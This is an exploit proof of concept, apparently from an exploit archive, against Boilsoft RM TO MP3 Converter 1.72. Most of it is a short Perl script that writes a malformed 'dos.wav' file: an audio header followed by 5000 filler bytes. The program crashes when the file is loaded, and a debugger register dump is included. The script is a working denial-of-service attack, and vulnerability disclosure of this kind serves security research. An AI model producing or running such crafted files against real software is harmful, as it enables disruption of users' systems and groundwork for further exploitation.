# Exploit Title: Boilsoft RM TO MP3 Converter 1.72 (.wav) - Crash POC
# Date: 21.11.2013
# Exploit Author: Akin Tosunlar
# Software Link: http://www.boilsoft.net/download/rmtomp3.exe
# Version: 1.72 (Probably old version of software and the LATEST version too)
# Vendor Homepage: http://www.boilsoft.net/
# Tested on: [ Windows XP sp3]
#============================================================================================
# After creating POC file (.wav), Add File To Program
#============================================================================================
# Contact :
#------------------
# Web Page : http://www.vigasis.com
#============================================================================================
 
#First chance exceptions are reported before any exception handling.
#This exception may be expected and handled.
#eax=ffffffff ebx=003b96d8 ecx=00000000 edx=00000000 esi=ffffffff edi=001b99ba
#eip=7498e82c esp=0012db78 ebp=0012dc0c iopl=0         nv up ei pl zr na pe nc
#cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00210246
   
#!/usr/bin/perl
 
my $file= "dos.wav";
 
my $header = "\x2E\x73\x6E\x64\x00\x00\x01\x18\x00\x00\x42\xDC\x00\x00\x00\x01" .
"\x00\x00\x1F\x40\x00\x00\x00\x00\x69\x61\x70\x65\x74\x75\x73\x2E" .
"\x61\x75\x00\x20\x22\x69\x61\x70\x65\x74\x75\x73\x2E\x61\x75\x22" .
"\x00\x31";
 
my $junk = "\x90" x 5000;
 
open($FILE,">$file");
print $FILE $header.$junk;
close($FILE);
print "DOS WAV FILE CREATED!!\n";
